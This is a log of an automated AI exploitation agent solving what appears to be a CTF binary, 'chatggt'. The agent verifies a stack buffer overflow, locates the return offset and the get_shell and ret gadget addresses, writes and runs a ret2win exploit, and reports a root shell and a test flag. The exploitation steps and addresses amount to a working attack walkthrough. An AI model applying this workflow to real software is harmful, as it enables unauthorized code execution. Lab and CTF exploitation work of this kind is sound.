22:37:39 [impact:BUG-001]   ← execute(0.2s): === PRIM-001: Testing RIP_CONTROL (return address = get_shell 0x4011f6) === ⏎ === PRIM-002: Testing STACK_CONTROL (saved RBP = 0x4343434343434343) ===...(1713 chars)
22:37:39 [impact:BUG-001] → 调用 GLM...
22:39:26 [impact:BUG-001] ← GLM(106.9s): 调工具[submit_final_result]
22:39:26 [impact:BUG-001] 所有原语均已验证。让我总结一下证据：  **PRIM-001 (RIP_CONTROL) — 已验证：** - 在偏移量 264 处的返回地址槽位被覆盖为 0x00000000004011f6 (get_shell) - 执行 `ret` 指令后，RIP = 0x4011f6 = get_shell
22:39:26 [impact:BUG-001] ✓ submit_final_result 收到最终报告（PrimitiveReport 校验通过，18564 chars）
22:39:26 [impact:BUG-001] → 调用 GLM...
22:39:36 [impact:BUG-001] ← GLM(10.0s)
22:39:36 [impact:BUG-001] S3 分析已完成。以下是为 BUG-001 验证的内容摘要：  **BUG-001：start_chat 中的栈缓冲区溢出** — `read(0, rbp-0x100, 0x12c)` 将 300 字节读取到 256 字节的缓冲区中，导致 44 字节的溢出。  **已验证三个原语：**  1. *
22:39:36 [stage3] 保存 → /work/workspace/0032-2024-64-chatggt-20260909-223056/stage3.json
22:39:36 --- S4 Exploit ---
22:39:36 === exploit (bug_id=-) ===
22:39:36 [exploit] → 调用 GLM...
22:39:40 [exploit] ← GLM(3.7s): 调工具[read_file, read_file]
22:39:40 [exploit] 我将首先阅读相关的技能文件，然后规划利用路线。
22:39:40 [exploit]   → 工具 read_file({"file_path": "/work/leanagent/skills/rop-ret2libc/SKILL.md", "limit": 1000})
22:39:40 [exploit]   → 工具 read_file({"file_path": "/work/leanagent/skills/got-overwrite/SKILL.md", "limit": 1000})
22:39:40 [exploit]   ← read_file(0.0s):  1  --- ⏎  2  name: rop-ret2libc ⏎  3  description: 栈溢出→RIP Control→ROP链/ret2libc/SROP拿shell。通用方法论。 ⏎  4  --- ⏎  5   ⏎  6  # ROP / ret2libc / SROP ⏎  ...(1300 chars)
22:39:40 [exploit]   ← read_file(0.0s):  1  --- ⏎  2  name: got-overwrite ⏎  3  description: 任意写→GOT表劫持→调system。Partial RELRO时通用方法论。 ⏎  4  --- ⏎  5   ⏎  6  # GOT Overwrite ⏎  7   ⏎  8  ## 适用...(1075 chars)
22:39:40 [exploit] → 调用 GLM...
22:39:45 [exploit] ← GLM(5.3s): 调工具[disassemble, disassemble]
22:39:45 [exploit] 我已经阅读了这两个技能。情况很明确：  - **S1**: 非 PIE 二进制文件，无 Canary，NX 开启，部分 RELRO，glibc 2.39 - **S2**: `start_chat` 中存在栈缓冲区溢出（300 字节写入 256 字节缓冲区，44 字节溢出） - **S3**: 已验
22:39:45 [exploit]   → 工具 disassemble({"binary": "/work/workspace/0032-2024-64-chatggt-20260909-223056/target", "function": "start_chat", "lines": 80})
22:39:45 [exploit]   → 工具 disassemble({"binary": "/work/workspace/0032-2024-64-chatggt-20260909-223056/target", "function": "get_shell", "lines": 20})
22:39:45 [exploit]   ← disassemble(0.0s): 000000000040127f <start_chat>: ⏎   40127f:	endbr64 ⏎   401283:	push   rbp ⏎   401284:	mov    rbp,rsp ⏎   401287:	sub    rsp,0x100 ⏎   40128e:	lea    r...(1093 chars)
22:39:45 [exploit]   ← disassemble(0.0s): 00000000004011f6 <get_shell>: ⏎   4011f6:	endbr64 ⏎   4011fa:	push   rbp ⏎   4011fb:	mov    rbp,rsp ⏎   4011fe:	lea    rax,[rip+0xe03]        # 402008...(298 chars)
22:39:45 [exploit] → 调用 GLM...
22:39:56 [exploit] ← GLM(10.8s): 调工具[find_ret_gadget]
22:39:56 [exploit] 反汇编确认了一切。让我分析一下栈对齐情况：  - `start_chat` 以 `push rbp; mov rbp,rsp; sub rsp,0x100` 开始 - 当 `start_chat` 返回时，`leave; ret` 会恢复栈 - 在 `ret` 处，RSP 指向返回地址。在 `ret
22:39:56 [exploit]   → 工具 find_ret_gadget({"binary": "/work/workspace/0032-2024-64-chatggt-20260909-223056/target"})
22:39:56 [exploit]   ← find_ret_gadget(0.1s): [{"addr": "0x000000000040101a", "insn": "ret"}]
22:39:56 [exploit] → 调用 GLM...
22:40:02 [exploit] ← GLM(5.6s): 调工具[probe_io]
22:40:02 [exploit] 在 `0x40101a` 处有一个 `ret` gadget。现在让我验证一下确切的偏移量。缓冲区位于 `rbp-0x100`，保存的 RBP 位于 `rbp+0`（从缓冲区开始的偏移量为 256），返回地址位于 `rbp+8`（偏移量为 264）。  Payload 结构： - 字节 0-3: `
22:40:02 [exploit]   → 工具 probe_io({"binary": "/work/workspace/0032-2024-64-chatggt-20260909-223056/target", "steps": "[{\"recv_until\": \">>>ChatGGT\", \"send\": \"\"}, {\"recv_until\")
22:40:02 [exploit]   ← probe_io(0.2s): RECV: b'>>>ChatGGT' ⏎ RECV: b' 1.0<<<\n\nQuestion' ⏎ SEND: 'hello' ⏎ RECV_TAIL: b' (Input EXIT to leave the chat): '
22:40:02 [exploit] → 调用 GLM...
22:40:22 [exploit] ← GLM(19.5s): 调工具[write_file]
22:40:22 [exploit] 好的，我理解了 I/O 模式。现在让我编写 exploit：
22:40:22 [exploit]   → 工具 write_file({"content": "#!/usr/bin/env python3\n# S4 Exploit: ret2win via stack buffer overflow in start_chat\n# Bug: read(0, rbp-0x100, 0x12c) reads 300 bytes i)
22:40:22 [exploit]   ← write_file(0.0s): Updated file /work/workspace/0032-2024-64-chatggt-20260909-223056/exploit.py
22:40:22 [exploit] → 调用 GLM...
22:40:24 [exploit] ← GLM(2.0s): 调工具[run_script]
22:40:24 [exploit] 现在让我运行 exploit：
22:40:24 [exploit]   → 工具 run_script({"path": "/work/workspace/0032-2024-64-chatggt-20260909-223056/exploit.py", "timeout": 30})
22:40:31 [exploit]   ← run_script(7.7s): rc=0 ⏎ --- stdout (summarized) --- ⏎ --- key evidence --- ⏎ [*] [*] id output: b'uid=0(root) gid=0(root) groups=0(root)\n' ⏎ LEANAGENT_SUCCESS ⏎ --- r...(841 chars)
22:40:31 [exploit] → 调用 GLM...
22:41:35 [exploit] ← GLM(64.0s): 调工具[submit_final_result]
22:41:35 [exploit] 漏洞利用已成功。证据很明确： - 获取了 root shell：`uid=0(root) gid=0(root) groups=0(root)` - 读取了 flag：`test_flag_content_here` - 打印输出了 `LEANAGENT_SUCCESS`  ret2win 路线运行
22:41:35 [exploit] ✓ submit_final_result 收到最终报告（ExploitReport 校验通过，10046 chars）
22:41:35 [exploit] → 调用 GLM...
22:41:46 [exploit] ← GLM(10.9s)
22:41:46 [exploit] 漏洞利用已成功提交。以下是所完成工作的总结：  ## S4 漏洞利用总结  **选择的路线**：ROUTE-01 — ret2win（直接返回到 `get_shell`）  **为什么选择此路线**： - 这是**最短可行路线** — 单次栈溢出，无需信息泄露，无需 ROP 链 - 二进制文件为非 
22:41:46 ✅ Exploit 成功（status=COMPLETED, result_status=EXPLOIT_SUCCESS）。
22:41:46 [stage4] 保存 → /work/workspace/0032-2024-64-chatggt-20260909-223056/stage4.json
22:42:00 📄 渗透报告：/work/workspace/0032-2024-64-chatggt-20260909-223056/report.md
=== 主 agent 汇总 ===
分析完成，结果如下：

## 漏洞分析结果

| 项目 | 结果 |
|------|------|
| **二进制路径** | `/work/workspace/0032-2024-64-chatggt-20260909-223056/target` |
| **Exploit 是否成功** | ✅ 成功 |
| **Exploit 脚本** | `/work/workspace/0032-2024-64-chatggt-20260909-223056/exploit.py` |
| **完整报告** | `/work/workspace/0032-2024-64-chatggt-20260909-223056/report.md` |
| **工作目录** | `/work/workspace/0032-2024-64-chatggt-20260909-223056/` |

### 总结

完整 S1-S4 漏洞分析流程已跑通：
- **S1 侦察** → **S2 语义分析** → **S3 原语验证** → **S4 exploit 构造**，最终 exploit 成功触发漏洞。

所有产物（stage1-4.json、exploit.py、report.md、full_run.log）均存放在上述 workspace 目录中，可直接查看 `report.md` 获取详细漏洞分析与利用过程。
